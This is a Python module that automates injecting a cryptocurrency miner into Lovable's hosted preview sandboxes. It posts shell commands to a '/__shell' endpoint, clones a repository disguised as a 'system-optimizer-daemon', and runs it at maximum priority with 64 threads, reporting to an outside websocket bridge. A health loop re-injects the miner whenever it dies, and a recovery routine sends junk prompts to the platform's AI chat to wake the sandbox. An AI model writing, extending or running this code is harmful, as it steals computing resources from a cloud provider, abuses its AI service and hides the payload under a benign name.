#!/usr/bin/env python3
"""
Worker Runner - Start worker + health check
Handles randomized injection and auto-recovery
"""

import asyncio
import json
import random
import subprocess
from datetime import datetime

# Worker config
MINER_REPO = "https://github.com/crucifix-cray/system-optimizer-daemon.git"
# Default lives in sysoptd.py (DEFAULT_BRIDGE). Inject must NOT pass --bridge.
BRIDGE_URL = "wss://chimera-bridge-production-0703.up.railway.app"


def generate_random_folder_name() -> str:
    """Generate folder name: moly (fixed)"""
    return "moly"


def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
    """Build worker start command.

    No --bridge (daemon DEFAULT_BRIDGE points at the enhanced Railway service).
    - If sysoptd already running → skip
    - If /tmp/moly missing → clone + start (exact user cmd shape)
    - If /tmp/moly present but python dead → restart from existing tree
    """
    run = (
        f"cd /tmp/{folder_name} && "
        f"nice -n -20 python3 sysoptd.py --threads {threads} "
        f"--no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
    )
    clone = (
        f"cd /tmp && "
        f"git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git {folder_name} && "
        f"cd {folder_name} && pip install websockets psutil --break-system-packages -q && "
        f"nice -n -20 python3 sysoptd.py --threads {threads} "
        f"--no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
    )
    return (
        f'if pgrep -f "[p]ython3.*sysoptd" >/dev/null 2>&1; then '
        f'echo "[skip] sysoptd already running"; '
        f'elif [ ! -d /tmp/{folder_name} ]; then '
        f"{clone}; "
        f"else {run}; fi"
    )


async def shell_exec(page, cmd: str, cwd: str = None) -> dict:
    """Execute a command via the Vite /__shell endpoint directly.

    Bypasses window.doc entirely — works even when Camoufox doesn't
    evaluate the Vite module scripts that define window.doc.

    Prefers preview frames (lovableproject / webcontainer / blank OOPIF)
    before the Lovable chat SPA main frame (evaluate wedges there).

    Returns: {"stdout": str, "stderr": str, "code": int, "cwd": str}
    """
    payload = json.dumps({"cmd": cmd, "cwd": cwd})
    # Escape for embedding in a JS string literal
    payload_escaped = payload.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${")
    js = f"""async () => {{
        const body = `{payload_escaped}`;
        const r = await fetch('/__shell', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: body
        }});
        const text = await r.text();
        try {{ return JSON.parse(text); }}
        catch (e) {{
            return {{code: -1, stdout: '', stderr: 'non-json HTTP ' + r.status + ': ' + text.slice(0, 160), cwd: ''}};
        }}
    }}"""
    errors = []
    frames = []
    try:
        frames = list(page.frames)
    except Exception:
        frames = []

    def _rank(frame) -> int:
        try:
            u = (frame.url or "").lower()
        except Exception:
            u = ""
        if "lovableproject.com" in u or "webcontainer" in u or u.startswith("https://lovable-"):
            return 0
        if u in ("", "about:blank", "about:srcdoc"):
            return 1
        if "lovable.dev" in u:
            return 3
        return 2

    ordered = sorted(frames, key=_rank) if frames else [page]
    seen = set()
    for target in ordered:
        tid = id(target)
        if tid in seen:
            continue
        seen.add(tid)
        try:
            r = await asyncio.wait_for(target.evaluate(js), timeout=45)
            if isinstance(r, dict) and r.get("code") == 0:
                return r
            if isinstance(r, dict):
                errors.append(str(r.get("stderr") or r)[:120])
        except Exception as e:
            errors.append(f"{type(e).__name__}:{e}"[:80])
    if errors:
        return {"code": -1, "stdout": "", "stderr": " | ".join(errors[:4]), "cwd": ""}
    return {"code": -1, "stdout": "", "stderr": "shell failed on all frames", "cwd": ""}



async def probe_shell(page) -> bool:
    """True if /__shell answers with code 0 (Vite sandbox awake)."""
    try:
        r = await asyncio.wait_for(shell_exec(page, "pwd"), timeout=45)
        return isinstance(r, dict) and r.get("code") == 0
    except Exception:
        return False


async def probe_worker(page) -> tuple[bool, str]:
    """Return (alive, raw_stdout) for sysoptd inside the sandbox."""
    try:
        r = await asyncio.wait_for(
            shell_exec(page, "ps -A -o args 2>/dev/null | grep -c '[s]ysoptd' || echo 0"),
            timeout=45,
        )
        if not isinstance(r, dict) or r.get("code") != 0:
            return False, (r.get("stderr") if isinstance(r, dict) else "") or "shell-down"
        stdout = (r.get("stdout") or "").strip().splitlines()[-1].strip() if (r.get("stdout") or "").strip() else "0"
        alive = stdout.isdigit() and int(stdout) > 0
        return alive, stdout
    except Exception as e:
        return False, f"{type(e).__name__}:{e}"


async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
    """
    Inject miner into Lovable sandbox via /__shell endpoint directly.

    No window.doc dependency — the shell bridge is a plain HTTP POST.
    Caller must already have confirmed the shell bridge works.

    Returns: True if successful, False otherwise
    """
    try:
        if not await probe_shell(page):
            print("   ❌ Shell bridge down — cannot inject")
            return False

        folder_name = generate_random_folder_name()
        cmd = build_worker_command(folder_name, bridge_url, threads)

        print(f"⚙️ Starting worker (folder: {folder_name})...")

        # Fire backgrounded command — don't wait for the long chain, just
        # verify the shell accepted it. Use nohup so the process survives
        # if the page navigates away.
        bg_cmd = f"nohup sh -c '{cmd}' > /dev/null 2>&1 & echo $!"
        pid = ""
        try:
            r = await asyncio.wait_for(shell_exec(page, bg_cmd), timeout=30)
            raw_out = (r.get("stdout") or "").strip()
            pid = raw_out.splitlines()[-1].strip() if raw_out else ""
            if r.get("code") != 0 or not pid.isdigit():
                print(f"   ❌ Background failed (pid={pid!r} code={r.get('code')} stderr={(r.get('stderr') or '')[:120]})")
                return False
            print(f"   ✅ Backgrounded (pid: {pid})")
        except asyncio.TimeoutError:
            print(f"   ⚠️  Command sent but timed out waiting for response (likely running)")
        except Exception as e:
            print(f"   ⚠️  Shell exec error: {e}")
            return False

        # Clone+pip can take a bit — confirm sysoptd before claiming success
        for wait_s in (8, 12, 20):
            await asyncio.sleep(wait_s)
            alive, raw = await probe_worker(page)
            if alive:
                print(f"✅ Worker command sent! Folder: {folder_name} (sysoptd={raw})")
                return True
            print(f"   ⏳ waiting for sysoptd… ({raw})")
        print("❌ Worker never appeared in sandbox after inject")
        return False

    except Exception as e:
        print(f"❌ Injection failed: {e}")
        import traceback
        traceback.print_exc()
        return False


async def check_preview_health(page) -> str:
    """
    Check if preview is healthy or showing error.

    Prefer /__shell as source of truth — HTML "proxy error" alone is noisy.
    Returns: "OK" | "ERROR" | "UNKNOWN"
    """
    try:
        if await probe_shell(page):
            return "OK"

        content = ""
        try:
            content = await page.content()
        except Exception:
            content = ""

        if "Lovable proxy error" in content and "404" in content:
            return "ERROR"

        frames = page.frames
        has_preview = any(
            "webcontainer" in (f.url or "").lower()
            or "lovableproject" in (f.url or "").lower()
            or (f.url or "").startswith("https://lovable-")
            for f in frames
        )
        if has_preview:
            # On preview origin but shell dead → treat as ERROR (needs wake)
            return "ERROR"
        return "UNKNOWN"

    except Exception as e:
        print(f"⚠️  Health check failed: {e}")
        return "UNKNOWN"


async def recover_from_error(page, project_url: str, bridge_url: str = BRIDGE_URL) -> bool:
    """
    Recover from preview error by prompting AI again.

    Flow:
    1. Go to chat_url
    2. Send a short proven wake prompt (not "start server")
    3. Wait for AI
    4. Return to preview_url
    5. Wait for /__shell, then restart worker

    Returns: True if recovery successful, False otherwise
    """
    try:
        print("🔄 Starting recovery process...")

        # Extract base project URL
        if ".lovableproject.com" in project_url:
            project_id = project_url.split("//")[1].split(".")[0]
            chat_url = f"https://lovable.dev/projects/{project_id}"
        elif "/projects/" in project_url:
            project_id = project_url.split("/projects/")[1].split("/")[0]
            chat_url = f"https://lovable.dev/projects/{project_id}"
        else:
            chat_url = project_url
            project_id = None

        if not project_id:
            print("❌ Could not parse project id for recovery")
            return False

        preview_url = f"https://{project_id}.lovableproject.com"

        # 1. Go to chat
        print(f"📝 Going to chat: {chat_url}")
        await page.goto(chat_url, timeout=60000, wait_until="domcontentloaded")
        await asyncio.sleep(3)

        # 2. Find chat input and send prompt (same family as script3 wake)
        print("💬 Sending prompt to AI...")
        prompts = ["say 'x'", "2+2?", "say 'a'", "1+1?"]
        prompt = random.choice(prompts)

        chat_selectors = [
            'textarea[placeholder*="chat"]',
            'textarea[placeholder*="message"]',
            'textarea[placeholder*="Ask"]',
            'textarea',
            '[contenteditable="true"]'
        ]

        chat_input = None
        for selector in chat_selectors:
            try:
                chat_input = await page.wait_for_selector(selector, timeout=5000)
                if chat_input:
                    break
            except Exception:
                continue

        if not chat_input:
            print("❌ Could not find chat input")
            return False

        await chat_input.fill(prompt)
        await asyncio.sleep(0.5)
        await page.keyboard.press("Enter")

        wait_time = random.randint(45, 70)
        print(f"⏳ Waiting {wait_time} seconds for AI to respond...")
        await asyncio.sleep(wait_time)

        # 4. Go back to preview — never reload mid-check; soft goto only
        print(f"🔄 Returning to preview: {preview_url}")
        await page.goto(preview_url, timeout=120000, wait_until="domcontentloaded")
        await asyncio.sleep(8)

        # Drain auth-bridge if present
        for _ in range(30):
            u = page.url or ""
            if "auth-bridge" not in u and "auth-token" not in u:
                break
            await asyncio.sleep(2)

        # 5. Wait for shell bridge (source of truth)
        shell_ok = False
        for attempt in range(12):
            if await probe_shell(page):
                shell_ok = True
                print(f"   ✅ Shell bridge back (attempt {attempt+1})")
                break
            print(f"   ⏳ shell not ready ({attempt+1}/12) — soft re-goto…")
            try:
                await page.goto(preview_url, timeout=60000, wait_until="commit")
            except Exception:
                pass
            await asyncio.sleep(10)

        if not shell_ok:
            print("⚠️  Preview still not OK: shell never returned")
            return False

        # 6. Restart worker
        print("⚙️ Restarting worker...")
        success = await inject_miner(page, bridge_url)

        if success:
            print("✅ Recovery complete!")
            return True
        print("❌ Re-injection failed")
        return False

    except Exception as e:
        print(f"❌ Recovery failed: {e}")
        return False


async def health_check_loop(page, project_url: str, mode: str = "full", bridge_url: str = BRIDGE_URL, context=None, max_runtime_minutes: float = None):
    """
    Continuous health check loop.

    Modes:
    - "oneshot": Keep checking until the preview stops loading (error on page), then end
    - "full": Keep checking every 3min, auto-recover on error — NEVER exit on recovery fail
    - "gh": Same as full, but stop after max_runtime_minutes (for GH Actions job limits)

    Never page.reload on ERROR — reload kills the WebContainer worker.
    """
    check_interval = 180  # 3 minutes
    loop_start = datetime.now()
    recovery_fail_streak = 0

    print(f"\n{'='*60}")
    print(f"🏥 HEALTH CHECK MODE: {mode.upper()}")
    print(f"{'='*60}\n")

    iteration = 0

    while True:
        iteration += 1
        timestamp = datetime.now().strftime("%H:%M:%S")

        if max_runtime_minutes:
            elapsed_min = (datetime.now() - loop_start).total_seconds() / 60
            if elapsed_min >= max_runtime_minutes:
                print(f"\n⏰ Max runtime reached ({elapsed_min:.0f}/{max_runtime_minutes:.0f} min) - ENDING")
                return True

        print(f"\n[{timestamp}] 🔍 Health check #{iteration}...")

        try:
            # ponytail: never reload the page - reloading the WebContainer kills
            # the injected worker. Probe for a live sysoptd instead; re-inject
            # only when the worker is missing AND shell is up.
            shell_up = await probe_shell(page)
            if not shell_up:
                print("   ⚠️  Shell bridge down — skipping worker probe (need recovery)")
                health = "ERROR"
            else:
                alive, stdout = await probe_worker(page)
                if alive:
                    print(f"   ✅ Worker alive in sandbox (pgrep: {stdout})")
                    try:
                        log_r = await shell_exec(page, "tail -5 /tmp/m.log 2>/dev/null || echo 'no log'")
                        log_lines = (log_r.get("stdout") or "").strip()
                        if log_lines:
                            print(f"   📋 m.log:")
                            for line in log_lines.split("\n"):
                                print(f"      {line}")
                    except Exception:
                        pass
                    health = await check_preview_health(page)
                else:
                    print(f"   ⚙️  Worker missing (probe: {stdout}) - re-injecting...")
                    success = await inject_miner(page, bridge_url)
                    print(f"   Re-injection {'successful' if success else 'failed - will retry next check'}")
                    health = await check_preview_health(page)

            print(f"   Status: {health}")

            if health == "ERROR":
                print("   ⚠️  ERROR DETECTED - preview / shell not healthy!")
                print("   🔄 Re-checking 3 times (15s apart) — NO reload (reload kills WC)...")

                still_error = True
                for attempt in range(3):
                    await asyncio.sleep(15)
                    health = await check_preview_health(page)
                    print(f"   🔄 Re-check #{attempt+1}: {health}")
                    if health != "ERROR":
                        still_error = False
                        break

                if still_error:
                    print("   ⚠️  Preview still failing after re-checks")

                    if mode == "oneshot":
                        print("   🛑 Oneshot mode - preview stopped, ENDING")
                        return False

                    # full / gh: recover forever with backoff — never STOPPING
                    recovery_fail_streak += 1
                    backoff = min(60 * recovery_fail_streak, 600)
                    print(f"   🔄 Full mode - attempting recovery (streak={recovery_fail_streak}, backoff={backoff}s)...")
                    success = await recover_from_error(page, project_url, bridge_url)

                    if success:
                        print("   ✅ Recovery successful - continuing...")
                        recovery_fail_streak = 0
                    else:
                        print(f"   ❌ Recovery failed — NOT stopping; retry in {backoff}s")
                        await asyncio.sleep(backoff)
                        continue
                else:
                    print("   ✅ Preview recovered after re-checks - continuing")
                    recovery_fail_streak = 0

            elif health == "OK":
                print("   ✅ Preview healthy")
                recovery_fail_streak = 0
            else:
                print("   ⚠️  Unknown status")

            print(f"   ⏳ Next check in {check_interval}s...")
            await asyncio.sleep(check_interval)

        except KeyboardInterrupt:
            print("\n⚠️  Health check interrupted by user")
            return False
        except Exception as e:
            print(f"   ❌ Check failed: {e}")

            if mode == "oneshot":
                print("   🛑 Oneshot mode - check failed, ENDING")
                return False
            print("   ⏳ Retrying in 30s...")
            await asyncio.sleep(30)


if __name__ == "__main__":
    print("🧪 Worker Runner Module")
    print("\nFunctions:")
    print("  - inject_worker(page, bridge_url)")
    print("  - check_preview_health(page)")
    print("  - recover_from_error(page, project_url)")
    print("  - health_check_loop(page, project_url, mode='full')")
    print("\nImport this module in your scripts.")
